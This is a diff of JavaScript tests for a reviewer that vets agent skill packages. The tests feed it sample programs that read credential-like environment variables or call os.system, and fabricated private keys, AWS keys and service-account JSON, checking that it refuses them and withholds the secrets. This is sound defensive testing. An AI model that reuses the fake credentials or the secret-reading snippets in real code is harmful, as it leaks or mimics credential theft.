+  calls.forEach(([call, system], i) => {
+    const found = answer.refusals.filter((r) => r.file === `${dir}/load${i}.py`).map((r) => [r.system, r.line]);
+    assert.deepEqual(found, [[system, 3]], call);
+  });
+});
+
+test("SR-22 refuses a PEP 263 declaration on either of Python's first two lines, naming the line it is on by line feeds", () => {
+  const dir = "skills/read-tickets/scripts";
+  const two = "#!/usr/bin/env python\n# -*- coding: latin-1 -*-\nprint(1)\n";
+  const programs = [
+    [two, 2],
+    [two.replace(/\n/g, "\r\n"), 2],
+    [two.replace(/\n/g, "\r"), 1], // a lone \r ends Python's first line, but a line is counted by \n alone
+    ["\n# coding: latin-1\n", 2],
+    ["#\n# coding: latin-1\n", 2],
+    ["# coding=latin-1\n", 1],
+    ["#coding: latin-1\n", 1],
+  ];
+  const p = basePackage();
+  programs.forEach(([text], i) => { p[`${dir}/enc${i}.py`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  programs.forEach(([text, line], i) => {
+    const found = answer.refusals.filter((r) => r.file === `${dir}/enc${i}.py`);
+    assert.deepEqual(found.map((r) => [r.rule, r.system]), [["unread-code", "coding: latin-1"]], JSON.stringify(text));
+    if (line !== null) assert.equal(found[0].line, line, JSON.stringify(text));
+  });
+});
+
+test("SR-22 passes a coding comment after a line of code or after code on its line, and one that names no encoding", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  ["x = 1\n# coding: latin-1\n", "x = 1  # coding: latin-1\n", "# coding: \n"].forEach((text, i) => { p[`${dir}/enc${i}.py`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  assert.deepEqual(answer.statement.accepted_knowingly, []);
+});
+
+test("SR-22 reads a Python program CPython rejects as far as it can, refusing none as unreadable and inventing no import", () => {
+  const dir = "skills/read-tickets/scripts";
+  const clean = basePackage();
+  ["import\n", "import a,\n", "import importlib\nimportlib.import_module('a'"].forEach((text, i) => { clean[`${dir}/bad${i}.py`] = text; });
+  const first = review(clean).answer;
+  assert.equal(first?.result, "passed", JSON.stringify(first?.refusals ?? first));
+  assert.deepEqual(first.statement.accepted_knowingly, []);
+
+  // Each file may name only the module path it spells. The first must be named: it is found before the error.
+  const named = [
+    ["import tests.helpers\nimport a,\n", "tests.helpers"],
+    ["from tests\n", "tests"],
+    ["import a as 1, tests\n", "tests"],
+    ["from pkg import a as 1, tests\n", "pkg.tests"],
+  ];
+  const p = basePackage();
+  named.forEach(([text], i) => { p[`${dir}/bad${i}.py`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused", JSON.stringify(answer));
+  assert.ok(refusal(answer, "unread-code", "tests.helpers"), JSON.stringify(answer.refusals));
+  for (const r of answer.refusals) {
+    const i = named.findIndex((_, k) => r.file === `${dir}/bad${k}.py`);
+    assert.deepEqual([r.rule, r.system, r.line], ["unread-code", named[i]?.[1], 1], JSON.stringify(r));
+  }
+});
+
+test("SR-22 reads past a comment inside the brackets of a from-import or an import_module call", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/a.py`] = "from pkg import (\n    a,  # first\n    tests,\n)\n";
+  p[`${dir}/b.py`] = 'import importlib\nimportlib.import_module(  # which\n    "tests")\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  const found = answer.refusals.map((r) => [r.rule, r.system, r.file, r.line]);
+  assert.deepEqual(found, [["unread-code", "pkg.tests", `${dir}/a.py`, 1], ["unread-code", "tests", `${dir}/b.py`, 3]]);
+});
+
+test("SR-17 accepts knowingly an os.system call that a comment splits inside parentheses", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/run.py`] = "import os\n(os  # c\n .system('ls'))\n";
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  const a = answer.statement.accepted_knowingly;
+  assert.equal(a.length, 1, JSON.stringify(a));
+  assert.equal(a[0].file, `${dir}/run.py`);
+});
+
+test("SR-09 names each destructured credential-like key, quoted or not, at the line it is written on", () => {
+  const dir = "skills/read-tickets/scripts";
+  const programs = [
+    ["const {API_KEY} = process.env;\n", [["API_KEY", 1]]],
+    ['const { "API_KEY": k } = process.env;\n', [["API_KEY", 1]]],
+    ["const {\nAPI_KEY } = process.env;\n", [["API_KEY", 2]]],
+    ["const {A_KEY,\nB_KEY} = process.env;\n", [["A_KEY", 1], ["B_KEY", 2]]],
+    ["const {\n  A_KEY,\n  B_KEY,\n} = process.env;\n", [["A_KEY", 2], ["B_KEY", 3]]],
+    ["const {a,b,c,d,KEY\n} = process.env;\n", [["KEY", 1]]],
+  ];
+  const p = basePackage();
+  programs.forEach(([text], i) => { p[`${dir}/env${i}.mjs`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  programs.forEach(([text, want], i) => {
+    const found = answer.refusals
+      .filter((r) => r.rule === "undeclared-reach" && r.file === `${dir}/env${i}.mjs`)
+      .map((r) => [r.system, r.line])
+      .sort((x, y) => x[1] - y[1]);
+    assert.deepEqual(found, want, JSON.stringify(text));
+  });
+});
+
+test("SR-09 reads no name from a rest element or an empty key, and accepts knowingly a destructured name that is not credential-like", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/one.mjs`] = "const { a } = process.env;\n";
+  p[`${dir}/rest.mjs`] = "const { HOME, ...REST_TOKEN } = process.env;\n";
+  p[`${dir}/empty.mjs`] = 'const { "": k } = process.env;\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  const a = answer.statement.accepted_knowingly;
+  assert.deepEqual(a.map((x) => x.file).sort(), [`${dir}/one.mjs`, `${dir}/rest.mjs`], JSON.stringify(a));
+  assert.match(a.find((x) => x.file === `${dir}/rest.mjs`).what, /HOME/);
+  assert.ok(!JSON.stringify(answer).includes("REST_TOKEN"), "a rest element reads no name");
+});
+
+test("SR-22 refuses a name a from-import lists after an as-alias, naming the module path", () => {
+  const dir = "skills/read-tickets/scripts";
+  const programs = ["from pkg import a as b, tests\n", "from pkg import (a as b, tests)\n", "from pkg import a as b, c as d, tests as t\n"];
+  const p = basePackage();
+  programs.forEach((text, i) => { p[`${dir}/alias${i}.py`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  programs.forEach((text, i) => {
+    const found = answer.refusals.filter((r) => r.file === `${dir}/alias${i}.py`).map((r) => [r.rule, r.system, r.line]);
+    assert.deepEqual(found, [["unread-code", "pkg.tests", 1]], JSON.stringify(text));
+  });
+});
+
+test("SR-09 reads no environment variable through a name that only ends in os, or by an empty name", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/xos.py`] = [
+    "class X:",
+    "    environ = {}",
+    "    def getenv(self, k): return k",
+    "xos = X()",
+    'a = xos.environ["API_KEY"]',
+    'b = xos.environ.get("API_KEY")',
+    'c = xos.getenv("API_KEY")',
+    "",
+  ].join("\n");
+  p[`${dir}/empty.py`] = 'import os\na = os.environ[""]\nb = os.environ.get("")\nc = os.getenv("")\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  assert.deepEqual(answer.statement.accepted_knowingly, []);
+});
+
+test("SR-17 accepts knowingly an os.system call with or without its import, and no platform.system, os.path or node:fs use", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/sys0.py`] = "import os; os.system('ls')\n";
+  p[`${dir}/sys1.py`] = "# entry point\nos.system('ls')\n";
+  p[`${dir}/plat.py`] = "import platform\nplatform.system()\n";
+  p[`${dir}/path.py`] = "import os\nos.path.join('a')\n";
+  p[`${dir}/fs.mjs`] = 'import fs from "node:fs";\nexport default fs;\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  const a = answer.statement.accepted_knowingly;
+  assert.deepEqual(a.map((x) => x.file).sort(), [`${dir}/sys0.py`, `${dir}/sys1.py`], JSON.stringify(a));
+});
+
+test("SR-22 refuses a literal test module passed to a bare import_module, one imported from importlib, or another object's", () => {
+  const dir = "skills/read-tickets/scripts";
+  const programs = [
+    "# entry point\nimport_module('tests')\n",
+    "from importlib import import_module\nimport_module('tests')\n",
+    "import os\nx.import_module('tests')\n",
+  ];
+  const p = basePackage();
+  programs.forEach((text, i) => { p[`${dir}/call${i}.py`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  programs.forEach((text, i) => {
+    const found = answer.refusals.filter((r) => r.file === `${dir}/call${i}.py`).map((r) => [r.rule, r.system, r.line]);
+    assert.deepEqual(found, [["unread-code", "tests", 2]], JSON.stringify(text));
+  });
+});
+
+test("SR-08 does not refuse text a URL parser rejects or a host written as a field, and still refuses a URL beside them", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/rej.mjs`] = 'export const u = "http://:8080/x";\nexport const v = "https://ok.example/";\n';
+  p[`${dir}/tpl.mjs`] = "const host = 'h';\nexport const u = `https://${host}/x`;\n";
+  p[`${dir}/rej.py`] = 'u = "http://:8080/x"\nv = "https://[::1/x"\n';
+  p[`${dir}/fstr.py`] = 'host = "h"\nu = f"https://{host}/x"\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  assert.deepEqual(answer.refusals.map((r) => [r.rule, r.system, r.file, r.line]), [["undeclared-reach", "ok.example", `${dir}/rej.mjs`, 2]]);
+});
+
+
+// SR-01: one answer for a Python program cut off mid-token (reopen 3, pytok slice)
+
+test("SR-01 answers once, on one line, for a Python program cut off inside an f-string field, a format spec or a string", () => {
+  const programs = [
+    'import subprocess\ns = f"{x:',
+    'import subprocess\ns = f"{x',
+    'import subprocess\ns = "abc',
+    "{{}}f'\\{if",
+    "a{bcdefghij:\nf'{y:",
+    ";'{\"\"\"import subprocess'\\\n\\{ifr\"'''",
+  ];
+  for (const text of programs) {
+    const p = basePackage();
+    p["skills/read-tickets/scripts/cut.py"] = text;
+    const { status, stdout, answer } = review(p);
+    assert.equal(status, 0, JSON.stringify(text));
+    assert.ok(stdout.endsWith("\n"), `the answer ends with a newline: ${JSON.stringify(text)}`);
+    assert.equal(stdout.trimEnd().split("\n").length, 1, `the answer is on one line: ${JSON.stringify(text)}`);
+    assert.ok(answer !== null && typeof answer === "object" && !Array.isArray(answer), JSON.stringify(text));
+    assert.ok(["passed", "refused"].includes(answer.result), `${JSON.stringify(text)}: ${answer.result}`);
+  }
+});
+
+
+// Reopen 3, slice "others": tests for spec 0.3.0.
+
+test("SR-01 still writes one JSON object for a request too deep to finish, refused as unreadable with the package it read", () => {
+  // An extra member of the owner's limit, 100,000 arrays deep. JSON.parse reads it, and Node's
+  // JSON.stringify cannot write it back, so a reviewer that echoes the limit cannot finish.
+  const dir = writePackage(basePackage());
+  const depth = 100000;
+  const text = `{"review":"v1","ask":"review","package":${JSON.stringify(dir)},"owner":{"spend_limit":`
+    + `{"most_micro":1,"currency":"USD","per":"day","note":${"[".repeat(depth)}${"]".repeat(depth)}},"ceilings":[]}}`;
+  const { status, stdout, answer } = run(text);
+  assert.equal(status, 0);
+  assert.ok(stdout.endsWith("\n"), "the answer ends with a newline");
+  assert.equal(stdout.trimEnd().split("\n").length, 1, "the answer is on one line");
+  assert.ok(answer !== null && typeof answer === "object", `one JSON object: ${stdout.slice(0, 200)}`);
+  if (answer.result === "passed") {
+    // A reviewer that can write this depth must state the limit member for member (SR-16).
+    let note = answer.statement.spends.limit.note;
+    let d = 1;
+    while (Array.isArray(note) && note.length === 1) { note = note[0]; d += 1; }
+    assert.deepEqual([d, note], [depth, []], "the note, member for member");
+    return;
+  }
+  assert.equal(answer.result, "refused", stdout.slice(0, 200));
+  assert.deepEqual(rules(answer), ["unreadable"], JSON.stringify(answer.refusals));
+  assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), "the refusal says why");
+  assert.deepEqual(answer.package, { name: "ticket-reader", version: "0.1.0", digest: expectedDigest(dir) }, "the package it read");
+});
+
+test("SR-02 refuses a request that is JSON but not an object, is not JSON, or carries another review, each with a why", () => {
+  const dir = writePackage(basePackage());
+  const inputs = ["null", "5", '"v1"', `[${JSON.stringify(request(dir))}]`, "this is not json", "", { ...request(dir), review: "v2" }];
+  for (const input of inputs) {
+    const label = JSON.stringify(input).slice(0, 80);
+    const { status, answer } = run(input);
+    assert.equal(status, 0, label);
+    assert.equal(answer?.result, "refused", label);
+    assert.deepEqual(rules(answer), ["bad-request"], label);
+    assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), `${label} says why`);
+  }
+});
+
+test("SR-02 refuses a review that names no package, or a blank or non-string one, and never reviews its working directory instead", () => {
+  const cwd = writePackage(basePackage());
+  const owner = { spend_limit: { ...LIMIT }, ceilings: [] };
+  assert.equal(run({ review: "v1", ask: "review", package: ".", owner }, cwd).answer?.result, "passed", "the working directory is a sound package");
+  for (const pkg of [undefined, "", "  ", "\n\t", 5, null, ["."]]) {
+    const req = { review: "v1", ask: "review", owner };
+    if (pkg !== undefined) req.package = pkg;
+    const label = pkg === undefined ? "no package" : `package ${JSON.stringify(pkg)}`;
+    const { status, answer } = run(req, cwd);
+    assert.equal(status, 0, label);
+    assert.equal(answer?.result, "refused", label);
+    assert.deepEqual(rules(answer), ["bad-request"], `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), `${label} says why`);
+    assert.equal(answer.package, undefined, `${label}: the working directory is not read`);
+  }
+});
+
+test("SR-05 refuses a missing package directory, a missing declaration, or one that is not JSON, as unreadable with a why", () => {
+  const changes = [
+    ["no descriptor", (p) => { p["agent-descriptor.json"] = null; }],
+    ["no runtime requirements", (p) => { p["agent-runtime-requirements.json"] = null; }],
+    ["a descriptor that is not JSON", (p) => { p["agent-descriptor.json"] = "{ not json"; }],
+    ["runtime requirements that are not JSON", (p) => { p["agent-runtime-requirements.json"] = "{ not json"; }],
+    ["a descriptor.json that is not JSON", (p) => { p["agent-descriptor.json"] = null; p["descriptor.json"] = "{ not json"; }],
+    ["an install.json that is not JSON", (p) => { p["agent-runtime-requirements.json"] = null; p["install.json"] = "{ not json"; }],
+  ];
+  const answers = [["a missing package directory", run(request(join(AGENT, "test", "no-such-package"))).answer]];
+  for (const [label, change] of changes) {
+    const p = basePackage();
+    change(p);
+    answers.push([label, review(p).answer]);
+  }
+  for (const [label, answer] of answers) {
+    assert.equal(answer?.result, "refused", label);
+    assert.ok(rules(answer).includes("unreadable"), `${label}: ${JSON.stringify(answer.refusals)}`);
+    for (const r of answer.refusals) assert.ok(typeof r.why === "string" && r.why.trim(), `${label}: ${r.rule} says why`);
+  }
+  assert.deepEqual(rules(answers[0][1]), ["unreadable"], "a missing directory, with a sound limit, is refused once");
+});
+
+test("SR-05 refuses as unreadable a descriptor or runtime requirements that parses as JSON but not as an object", () => {
+  // Beside each, the other declaration names no system, and no program ships, so a reviewer that
+  // read the non-object as empty would pass the package.
+  const bare = (p) => {
+    p[PROGRAM_PATH] = null;
+    p["agent-descriptor.json"].systems = [];
+    p["agent-runtime-requirements.json"].systems = [];
+    return p;
+  };
+  const cases = [
+    ["agent-descriptor.json", "[]\n"], ["agent-descriptor.json", "5\n"], ["agent-descriptor.json", "null\n"],
+    ["agent-runtime-requirements.json", "[]\n"], ["agent-runtime-requirements.json", "null\n"],
+    ["descriptor.json", '"text"\n'], ["install.json", "5\n"],
+  ];
+  const current = { "descriptor.json": "agent-descriptor.json", "install.json": "agent-runtime-requirements.json" };
+  assert.equal(review(bare(basePackage())).answer?.result, "passed", "the bare package passes");
+  for (const [name, body] of cases) {
+    const p = bare(basePackage());
+    if (current[name]) p[current[name]] = null;
+    p[name] = body;
+    const { answer } = review(p);
+    const label = `${name} ${JSON.stringify(body)}`;
+    assert.equal(answer?.result, "refused", label);
+    assert.deepEqual(rules(answer), ["unreadable"], `${label}: ${JSON.stringify(answer.refusals)}`);
+    assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), `${label} says why`);
+  }
+});
+
+test("SR-13 refuses every form the publisher's patterns accept: each private key type, compact service-account JSON, an ASIA key and an AWS secret written without spaces", () => {
+  const D = "-".repeat(5);
+  const header = (type) => [D, "BEGIN ", type, "PRIVATE", " KEY", D].join("");
+  const nkey = ["S", "A", "A2B3C4D5E6F7G2H3".repeat(3), "IJKLMNOP"].join("");
+  const asia = ["AS", "IA", "QQQQ", "EXAMPLE0", "ABCD"].join("");
+  const forms = [
+    [`${header("EC ")}\nMHcCAQEEIBkg\n`, header("EC "), /private key/i],
+    [`${header("DSA ")}\nMIIBuwIBAAKB\n`, header("DSA "), /private key/i],
+    [`${header("OPENSSH ")}\nb3BlbnNzaC1r\n`, header("OPENSSH "), /private key/i],
+    [`${header("PGP ")}\nlQOYBF0AAAAB\n`, header("PGP "), /private key/i],
+    [['{"type":"service', '_account"}\n'].join(""), ['"type":"service', '_account"'].join(""), /service-account key/i],
+    [['{"private', '_key":"', D, 'BEGIN\\nMIIEvQ"}\n'].join(""), ['"private', '_key":"', D, "BEGIN"].join(""), /service-account key/i],
+    [`id = ${asia}\n`, asia, /AWS access key/i],
+    [`${["aws_secret", "_access_key="].join("")}${"K".repeat(20)}\n`, `${["aws_secret", "_access_key="].join("")}${"K".repeat(20)}`, /AWS secret key/i],
+    [`${["AWS_SECRET", "_ACCESS_KEY: "].join("")}${"Q".repeat(24)}\n`, `${["AWS_SECRET", "_ACCESS_KEY: "].join("")}${"Q".repeat(24)}`, /AWS secret key/i],
+    [`seed ${nkey} here\n`, nkey, /NKey seed/i],
+  ];
+  const p = basePackage();
+  forms.forEach(([text], i) => { p[`references/form-${i}.md`] = text; });
+  const { answer, stdout } = review(p);
+  assert.equal(answer?.result, "refused");
+  forms.forEach(([text, secret, kind], i) => {
+    const file = `references/form-${i}.md`;
+    const found = (answer.refusals ?? []).filter((r) => r.rule === "credential-in-files" && r.file === file);
+    assert.ok(found.some((r) => kind.test(r.why)), `${JSON.stringify(text)} is refused as ${kind}: ${JSON.stringify(found)}`);
+    assert.ok(!stdout.toLowerCase().includes(secret.toLowerCase()), `does not repeat ${JSON.stringify(secret)}`);
+  });
+});
+
+test("SR-13 passes text just outside each credential pattern's bounds, and refuses the same text inside them", () => {
+  const D = "-".repeat(5);
+  const key = FAKE.awsAccessKey();
+  const secret = ["aws_secret", "_access_key = "].join("");
+  const seed = ["S", "U", "A2B3C4D5E6F7G2H3".repeat(3), "IJKLMNOP"].join("");
+  const keystore = ["BEGIN ENCRYPTED", " PRIVATE KEY"].join("");
+  const rsa = ["BEGIN RSA", " PRIVATE KEY"].join("");
+  const outside = [
+    `id=x${key}\n`, `id = ${key}E\n`, `${secret}${"K".repeat(19)}\n`, `seed x${seed} here\n`, `seed ${seed}Q here\n`,
+    `----${keystore}${D}\n`, `${D}${keystore}----\n`, `----${rsa}${D}\n`,
+  ];
+  const inside = [`id = ${key}\n`, `${secret}${"K".repeat(20)}\n`, `seed ${seed} here\n`, `${D}${keystore}${D}\n`, `${D}${rsa}${D}\n`];
+  const p = basePackage();
+  outside.forEach((text, i) => { p[`references/outside-${i}.md`] = text; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  const q = basePackage();
+  inside.forEach((text, i) => { q[`references/inside-${i}.md`] = text; });
+  const refused = review(q).answer;
+  inside.forEach((text, i) => {
+    assert.ok(refused?.refusals?.some((r) => r.rule === "credential-in-files" && r.file === `references/inside-${i}.md`), `refuses ${JSON.stringify(text)}`);
+  });
+});
+
+test("SR-13 withholds a private key in a declaration field as its whole block, keeping the text after its END line", () => {
+  const D = "-".repeat(5);
+  const begin = (type) => [D, "BEGIN ", type, "PRIVATE", " KEY", D].join("");
+  const end = [D, "END ", "PRIVATE", " KEY", D].join("");
+  const cases = [
+    [`${begin("")}\nMIIEvQIBADANBgkqhkiG\n${end} for signing`, ["MIIEvQIBADANBgkqhkiG", "BEGIN PRIVATE KEY", "END PRIVATE KEY"], "for signing"],
+    [`${begin("RSA ")}\nMIIBOgIBAAJBAKj34Gkx\nwDtNlx7zyQq0WwVYY2Hn`, ["MIIBOgIBAAJBAKj34Gkx", "wDtNlx7zyQq0WwVYY2Hn", "BEGIN RSA PRIVATE KEY"], null],
+    // A line with four dashes on either side is not an END line, so the block runs on past it.
+    [`${begin("")}\nMIIEvQIBADANBgkqhkiG\n${end.slice(1)}\nQ2VydGlmaWNhdGVPbmU\n${end.slice(0, -1)}\nU2Vjb25kQm9keUxpbmU\n${end} for signing`,
+      ["MIIEvQIBADANBgkqhkiG", "Q2VydGlmaWNhdGVPbmU", "U2Vjb25kQm9keUxpbmU"], "for signing"],
+  ];
+  for (const [name, hidden, kept] of cases) {
+    const p = basePackage();
+    p["agent-descriptor.json"].systems.push({ name, access: "read" });
+    const { answer, stdout } = review(p);
+    assert.equal(answer?.result, "refused");
+    for (const h of hidden) assert.ok(!stdout.toLowerCase().includes(h.toLowerCase()), `withholds ${h}: ${stdout.slice(0, 300)}`);
+    const r = refusal(answer, "systems-mismatch");
+    assert.ok(r && typeof r.system === "string", "names the system only the descriptor has");
+    if (kept) assert.ok(r.system.endsWith(kept), `keeps the text after the block: ${JSON.stringify(r.system)}`);
+  }
+});
+
+test("SR-13 withholds the union of overlapping credential matches, leaving no fragment of any match in a name or a host", () => {
+  const key = FAKE.awsAccessKey();
+  const other = ["AK", "IA", "ZZZZZZZZZZZZZZZZ"].join("");
+  const secret = ["aws_secret", "_access_key = "].join("");
+  const cases = [
+    ["a secret whose value starts with an access key", (p) => {
+      p["agent-descriptor.json"].systems.push({ name: `${secret}${key}+x and more`, access: "read", needs: "x" });
+    }, [secret.trim(), key, "+x"]],
+    ["one key removed from a lowercased host, around another", (p) => {
+      p["references/notes.md"] = `${key}\n${other}\n`;
+      p[PROGRAM_PATH] += `fetch("https://${key.slice(0, 8)}${other}${key.slice(8)}.example.com/");\n`;
+    }, [key, other]],
+    ["two secrets in one decoded name", (p) => {
+      p["agent-descriptor.json"].systems.push({ name: `${secret}${"A".repeat(20)}" ${secret}${"B".repeat(20)}"`, access: "read", needs: "x" });
+    }, ["A".repeat(20), "B".repeat(20)]],
+  ];
+  for (const [label, change, hidden] of cases) {
+    const p = basePackage();
+    change(p);
+    const { answer, stdout } = review(p);
+    assert.equal(answer?.result, "refused", label);
+    for (const h of hidden) assert.ok(!stdout.toLowerCase().includes(h.toLowerCase()), `${label}: no ${JSON.stringify(h)} in ${stdout.slice(0, 400)}`);
+  }
+});
+
+test("SR-15 lists unreadable and spend-limit together for a missing package directory and no spending limit", () => {
+  const dir = join(AGENT, "test", "no-such-package");
+  const owners = [{}, undefined, { spend_limit: { ...LIMIT, most_micro: -1 }, ceilings: [] }];
+  for (const owner of owners) {
+    const req = request(dir, owner);
+    if (owner === undefined) delete req.owner;
+    const { answer } = run(req);
+    const label = JSON.stringify(owner ?? "no owner");
+    assert.equal(answer?.result, "refused", label);
+    assert.deepEqual(rules(answer).sort(), ["spend-limit", "unreadable"], label);
+    for (const r of answer.refusals) assert.ok(typeof r.why === "string" && r.why.trim(), `${label}: ${r.rule} says why`);
+  }
+});
+
+test("SR-16 lists in never each non-blank line of a string of refusals, or each non-blank string entry of an array, then the fixed refusal", () => {
+  const a = "Writing to the ticket store.";
+  const b = "Summarizing a ticket it was not handed.";
+  const tail = "reach any destination outside the systems in reaches";
+  const cases = [
+    [[a, 5, b], [a, b, tail]],
+    [[a, "", "  ", { text: "x" }, null, b], [a, b, tail]],
+    [`${a}\n\n${b}\n`, [a, b, tail]],
+    ["\n  \n", [tail]],
+    [undefined, [tail]],
+    [5, [tail]],
+  ];
+  for (const [refusals, never] of cases) {
+    const p = basePackage();
+    if (refusals === undefined) delete p["agent-descriptor.json"].refusals;
+    else p["agent-descriptor.json"].refusals = refusals;
+    const { answer } = review(p);
+    const label = JSON.stringify(refusals ?? "no refusals");
+    assert.equal(answer?.result, "passed", `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    assert.deepEqual(answer.statement.never, never, label);
+  }
+});
+
+test("SR-19 names the package by plugin.json's name and version where each is a non-blank string, and by the directory's name and agent_version member by member otherwise", () => {
+  const cases = [
+    [{ name: "ticket-tool", version: "2.0.0" }, "ticket-tool", "2.0.0"],
+    [null, "ticket-dir", "0.1.0"],
+    ["null\n", "ticket-dir", "0.1.0"],
+    ["{ not json\n", "ticket-dir", "0.1.0"],
+    ["[]\n", "ticket-dir", "0.1.0"],
+    [{ version: "2.0.0" }, "ticket-dir", "2.0.0"],
+    [{ name: "  ", version: "2.0.0" }, "ticket-dir", "2.0.0"],
+    [{ name: "ticket-tool" }, "ticket-tool", "0.1.0"],
+    [{ name: "ticket-tool", version: " " }, "ticket-tool", "0.1.0"],
+    [{ name: 5, version: 2 }, "ticket-dir", "0.1.0"],
+  ];
+  for (const [plugin, name, version] of cases) {
+    const p = basePackage();
+    p["plugin.json"] = plugin;
+    const dir = writePackage(p, "ticket-dir");
+    const { answer } = run(request(dir));
+    const label = JSON.stringify(plugin);
+    assert.equal(answer?.result, "passed", `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    assert.deepEqual(answer.statement.package, { name, version, digest: expectedDigest(dir) }, label);
+  }
+});
+
